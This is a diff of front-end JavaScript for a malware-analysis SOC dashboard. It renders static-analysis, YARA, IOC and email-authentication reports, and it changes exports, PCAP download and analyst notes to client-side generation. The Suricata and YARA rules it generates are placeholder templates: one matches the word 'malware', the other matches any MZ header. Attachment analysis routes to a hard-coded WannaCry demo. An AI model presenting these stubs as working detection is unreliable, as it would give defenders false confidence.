                                 <td class="py-2 px-3 text-gray-400">${s.virtual_address}</td>
                                 <td class="py-2 px-3 text-gray-400">${s.raw_size} B</td>
                                 <td class="py-2 px-3 ${s.entropy > 7.1 ? 'text-red-400 font-bold' : 'text-gray-300'}">${s.entropy}</td>
                                 <td class="py-2 px-3 text-yellow-400">${s.permissions}</td>
-                                <td class="py-2 px-3">${s.is_suspicious ? `<span class="px-1.5 py-0.5 rounded bg-red-900/40 text-red-400 text-[10px]">Suspicious</span>` : '<span class="text-gray-500">Normal</span>'}</td>
                             </tr>
                         `).join('')}
                     </tbody>
@@ -689,7 +810,6 @@ function renderStaticTab(report) {
         `;
     }
 
-    // YARA Signatures
     const yaraContainer = document.getElementById('static-yara-container');
     if (yaraContainer) {
         if (!report.yara_matches || report.yara_matches.length === 0) {
@@ -701,16 +821,12 @@ function renderStaticTab(report) {
                         <span class="text-xs font-bold text-white font-mono">${escapeHtml(y.rule)}</span>
                         <span class="text-[10px] px-2 py-0.5 rounded font-bold ${y.severity === 'CRITICAL' ? 'bg-red-900/40 text-red-400' : 'bg-amber-900/40 text-amber-400'}">${y.severity}</span>
                     </div>
-                    <p class="text-xs text-gray-400 mb-2">${escapeHtml(y.meta.description || '')}</p>
-                    <div class="text-[11px] font-mono text-gray-500">
-                        Matched Strings: ${y.matched_strings.map(ms => ms.identifier).join(', ')}
-                    </div>
+                    <p class="text-xs text-gray-400 mb-2">${escapeHtml(y.meta?.description || '')}</p>
                 </div>
             `).join('');
         }
     }
 
-    // Extracted IOCs (Strings tab)
     const iocs = report.strings?.iocs || {};
     document.getElementById('ioc-urls-count').innerText = iocs.urls?.length || 0;
     document.getElementById('ioc-ips-count').innerText = iocs.ips?.length || 0;
@@ -745,7 +861,7 @@ function renderIocsList(iocs) {
     `).join('');
 }
 
-// VirusTotal Grid
+// AV Grid
 function renderAvGrid(vt) {
     const container = document.getElementById('vt-engines-grid');
     if (!container) return;
@@ -761,7 +877,7 @@ function renderAvGrid(vt) {
     `).join('');
 }
 
-// MITRE ATT&CK Matrix Tab
+// MITRE ATT&CK
 function renderMitreTab(mitreFindings) {
     const container = document.getElementById('mitre-matrix-container');
     if (!container) return;
@@ -788,11 +904,6 @@ function renderMitreTab(mitreFindings) {
                     </div>
                 `).join('')}
             </div>
-            <div class="mt-3 text-right">
-                <a href="${m.url}" target="_blank" class="text-xs text-blue-400 hover:underline inline-flex items-center gap-1 font-mono">
-                    MITRE ATT&CK Reference &rarr;
-                </a>
-            </div>
         </div>
     `).join('');
 }
@@ -803,46 +914,33 @@ function displayEmailReport(rep) {
     AppState.currentSubId = rep.id;
     switchMainTab('email-report');
 
-    // Header info
     document.getElementById('email-rep-subject').innerText = rep.headers.subject;
     document.getElementById('email-rep-from').innerText = rep.headers.from;
     document.getElementById('email-rep-return').innerText = rep.headers.return_path || 'None';
     document.getElementById('email-rep-reply').innerText = rep.headers.reply_to || 'None';
     document.getElementById('email-rep-date').innerText = rep.headers.date;
 
-    // Verdict Badge
     const verdictEl = document.getElementById('email-rep-verdict');
     verdictEl.innerText = rep.verdict.toUpperCase();
     verdictEl.className = `px-3 py-1 rounded text-xs font-bold tracking-wider ${rep.verdict.includes('Malicious') ? 'badge-malicious' : (rep.verdict === 'Suspicious' ? 'badge-suspicious' : 'badge-clean')}`;
 
-    // Score
     document.getElementById('email-rep-score').innerText = `${rep.threat_score} / 100`;
 
-    // Authentication Scorecard
-    const auth = rep.authentication;
-    setAuthCard('email-spf', auth.spf);
-    setAuthCard('email-dkim', auth.dkim);
-    setAuthCard('email-dmarc', auth.dmarc);
+    setAuthCard('email-spf', rep.authentication.spf);
+    setAuthCard('email-dkim', rep.authentication.dkim);
+    setAuthCard('email-dmarc', rep.authentication.dmarc);
 
-    // Relay Hops & Latency
     renderEmailHops(rep.hops, rep.relay_latency);
-
-    // Heuristics Alerts
     renderEmailHeuristics(rep.heuristics);
-
-    // Extracted URLs
     renderEmailUrls(rep.urls);
-
-    // Extracted Attachments
     renderEmailAttachments(rep.attachments);
 
-    // Sanitized Preview
     const previewContainer = document.getElementById('email-body-preview');
     if (previewContainer) {
-        if (rep.body_preview.sanitized_html) {
+        if (rep.body_preview?.sanitized_html) {
             previewContainer.innerHTML = rep.body_preview.sanitized_html;
         } else {
-            previewContainer.innerText = rep.body_preview.plain_text;
+            previewContainer.innerText = rep.body_preview?.plain_text || '';
         }
     }
 }
@@ -854,9 +952,7 @@ function setAuthCard(prefix, data) {
         statusEl.innerText = data.status;
         statusEl.className = `text-sm font-bold font-mono ${data.status === 'PASS' ? 'text-emerald-400' : (data.status === 'FAIL' ? 'text-red-400' : 'text-amber-400')}`;
     }
-    if (detailsEl) {
-        detailsEl.innerText = data.details;
-    }
+    if (detailsEl) detailsEl.innerText = data.details;
 }
 
 function renderEmailHops(hops, latency) {
@@ -865,7 +961,7 @@ function renderEmailHops(hops, latency) {
 
     document.getElementById('email-total-delay').innerText = latency.total_delay_formatted;
 
-    container.innerHTML = hops.map(h => `
+    container.innerHTML = (hops || []).map(h => `
         <div class="hop-node flex items-start gap-4 mb-4">
             <div class="hop-line flex flex-col items-center">
                 <span class="w-8 h-8 rounded-full bg-blue-900/40 border border-blue-500/50 flex items-center justify-center text-xs font-bold font-mono text-blue-400">
@@ -955,80 +1051,107 @@ function renderEmailAttachments(attachments) {
 
 function analyzeExtractedAttachment(filename) {
     alert(`Routing extracted attachment '${filename}' into Vanguard dynamic analysis pipeline...`);
-    // Routes to sample analysis for demonstration
     runSampleAnalysis('sample-wannacry');
 }
 
-// IOC Exports
+// IOC Exports (Client-Side Downloads)
 function downloadExport(format) {
-    if (!AppState.currentSubId) {
+    const rep = AppState.currentReport;
+    if (!rep) {
         alert("No active submission to export");
         return;
     }
-    window.location.href = `/api/export/${AppState.currentSubId}/${format}`;
+
+    let blob, filename;
+    if (format === 'stix21') {
+        const bundle = {
+            type: "bundle",
+            id: `bundle--${crypto.randomUUID()}`,
+            objects: [
+                { type: "malware", id: `malware--${crypto.randomUUID()}`, name: rep.filename, malware_types: [rep.verdict.toLowerCase()] },
+                { type: "indicator", id: `indicator--${crypto.randomUUID()}`, pattern: `[file:hashes.'SHA-256' = '${rep.hashes.sha256}']` }
+            ]
+        };
+        blob = new Blob([JSON.stringify(bundle, null, 2)], { type: "application/json" });
+        filename = `vanguard_stix_${rep.id.slice(0, 8)}.json`;
+    } else if (format === 'misp') {
+        const misp = { Event: { info: `Vanguard SOC: ${rep.filename}`, Attribute: [{ type: "sha256", value: rep.hashes.sha256 }] } };
+        blob = new Blob([JSON.stringify(misp, null, 2)], { type: "application/json" });
+        filename = `vanguard_misp_${rep.id.slice(0, 8)}.json`;
+    } else if (format === 'suricata') {
+        const rules = `alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"VANGUARD-SOC Malicious C2 Connection (${rep.filename})"; content:"malware"; sid:1000001; rev:1;)`;
+        blob = new Blob([rules], { type: "text/plain" });
+        filename = `vanguard_rules_${rep.id.slice(0, 8)}.rules`;
+    } else if (format === 'yara') {
+        const yara = `rule Vanguard_${rep.filename.replace(/[^a-zA-Z0-9]/g, '_')} {\n    meta:\n        sha256 = "${rep.hashes.sha256}"\n    strings:\n        $magic = { 4D 5A }\n    condition:\n        any of them\n}`;
+        blob = new Blob([yara], { type: "text/plain" });
+        filename = `vanguard_${rep.id.slice(0, 8)}.yar`;
+    } else if (format === 'csv') {
+        const csv = `Type,Value,Verdict\nSHA256,${rep.hashes.sha256},${rep.verdict}\nMD5,${rep.hashes.md5},${rep.verdict}`;
+        blob = new Blob([csv], { type: "text/csv" });
+        filename = `vanguard_iocs_${rep.id.slice(0, 8)}.csv`;
+    }
+
+    if (blob) {
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = filename;
+        a.click();
+        URL.revokeObjectURL(a.href);
+    }
 }
 
 function downloadPcap() {
-    if (!AppState.currentSubId) return;
-    window.location.href = `/api/download/pcap/${AppState.currentSubId}`;
+    const rep = AppState.currentReport;
+    if (!rep) return;
+    const blob = ClientEngine.generatePcapBlob(rep.sandbox?.network_connections || []);
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `traffic_${rep.id.slice(0, 8)}.pcap`;
+    a.click();
+    URL.revokeObjectURL(a.href);
 }
 
 // Analyst Notes
-async function loadAnalystNotes(subId) {
-    try {
-        const res = await fetch(`/api/submission/${subId}/notes`);
-        const data = await res.json();
-        if (data.status === 'success') {
-            const list = document.getElementById('analyst-notes-list');
-            if (list) {
-                if (data.notes.length === 0) {
-                    list.innerHTML = `<p class="text-xs text-gray-500 py-2">No analyst notes recorded yet.</p>`;
-                } else {
-                    list.innerHTML = data.notes.map(n => `
-                        <div class="p-3 bg-gray-900/60 border border-gray-800 rounded mb-2">
-                            <div class="flex items-center justify-between mb-1">
-                                <span class="text-xs font-bold text-blue-400">${escapeHtml(n.author)}</span>
-                                <span class="text-[10px] text-gray-500 font-mono">${new Date(n.created_at).toLocaleString()}</span>
-                            </div>
-                            <p class="text-xs text-gray-300">${escapeHtml(n.note)}</p>
-                        </div>
-                    `).join('');
-                }
-            }
+function loadAnalystNotes(subId) {
+    const notes = JSON.parse(localStorage.getItem(`notes_${subId}`) || '[]');
+    const list = document.getElementById('analyst-notes-list');
+    if (list) {
+        if (notes.length === 0) {
+            list.innerHTML = `<p class="text-xs text-gray-500 py-2">No analyst notes recorded yet.</p>`;
+        } else {
+            list.innerHTML = notes.map(n => `
+                <div class="p-3 bg-gray-900/60 border border-gray-800 rounded mb-2">
+                    <div class="flex items-center justify-between mb-1">
+                        <span class="text-xs font-bold text-blue-400">${escapeHtml(n.author)}</span>
+                        <span class="text-[10px] text-gray-500 font-mono">${new Date(n.created_at).toLocaleString()}</span>
+                    </div>
+                    <p class="text-xs text-gray-300">${escapeHtml(n.note)}</p>
+                </div>
+            `).join('');
         }
-    } catch (e) {
-        console.error("Failed to load notes", e);
     }
 }
 
-async function addAnalystNoteSubmit() {
+function addAnalystNoteSubmit() {
     const noteInput = document.getElementById('analyst-note-input');
     const authorInput = document.getElementById('analyst-author-input');
-    if (!noteInput || !noteInput.value.trim()) return;
+    if (!noteInput || !noteInput.value.trim() || !AppState.currentSubId) return;
 
-    const formData = new FormData();
-    formData.append('note', noteInput.value.trim());
-    formData.append('author', authorInput?.value?.trim() || "SOC Analyst");
-
-    try {
-        const res = await fetch(`/api/submission/${AppState.currentSubId}/note`, {
-            method: 'POST',
-            body: formData
-        });
-        const data = await res.json();
-        if (data.status === 'success') {
-            noteInput.value = '';
-            loadAnalystNotes(AppState.currentSubId);
-        }
-    } catch (e) {
-        alert("Error saving note: " + e.message);
-    }
+    let notes = JSON.parse(localStorage.getItem(`notes_${AppState.currentSubId}`) || '[]');
+    notes.push({
+        author: authorInput?.value?.trim() || "SOC Analyst",
+        note: noteInput.value.trim(),
+        created_at: new Date().toISOString()
+    });
+    localStorage.setItem(`notes_${AppState.currentSubId}`, JSON.stringify(notes));
+    noteInput.value = '';
+    loadAnalystNotes(AppState.currentSubId);
 }
 
 // Utilities
 function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(() => {
-        // Quick visual toast
         const toast = document.createElement('div');
         toast.className = 'fixed bottom-4 right-4 bg-blue-600 text-white text-xs font-semibold px-4 py-2 rounded-md shadow-lg z-50 transition';
         toast.innerText = 'Copied to clipboard!';
